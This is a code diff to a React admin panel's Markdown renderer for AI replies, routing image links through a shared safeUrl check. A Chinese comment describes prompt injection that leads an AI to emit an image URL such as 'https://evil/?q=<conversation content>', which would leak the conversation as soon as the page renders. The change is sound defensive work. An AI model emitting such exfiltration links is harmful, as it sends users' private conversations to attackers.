@@ -1,6 +1,7 @@
 import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { cn } from '@/lib/utils';
+import { safeUrl } from '@/lib/safeUrl';
 
 /**
  * 管理后台的 AI 回复 Markdown 渲染（对话测试 / 会话详情 / 人工工作台 / 卡片里的文字片段）。
@@ -42,11 +43,15 @@ const components: Components = {
     hr: () => <hr className="my-3 border-current/20" />,
     // 图片一律不自动加载、只给链接（2026-09-30 安全审查 M7）：AI 回复的 ![](url) 可能是被提示注入诱导出来的
     // 外带地址（https://evil/?q=<对话内容>），一渲染就会自动发请求。widget 的 Markdown 本就不渲染图片，两端口径一致。
-    img: ({ src, alt }) => (typeof src === 'string' && /^https?:\/\//i.test(src) ? (
-        <a href={src} target="_blank" rel="noopener noreferrer" className="underline underline-offset-2 break-all">
-            查看图片{alt ? `：${alt}` : ''}
-        </a>
-    ) : null),
+    img: ({ src, alt }) => {
+        // 与卡片 image 节点同一个准入口径（safeUrl：只放行 http/https、限长）
+        const href = safeUrl(src);
+        return href ? (
+            <a href={href} target="_blank" rel="noopener noreferrer" className="underline underline-offset-2 break-all">
+                查看图片{alt ? `：${alt}` : ''}
+            </a>
+        ) : null;
+    },
     table: ({ children }) => (
         <div className="my-2 overflow-x-auto">
             <table className="text-xs border-collapse">{children}</table>
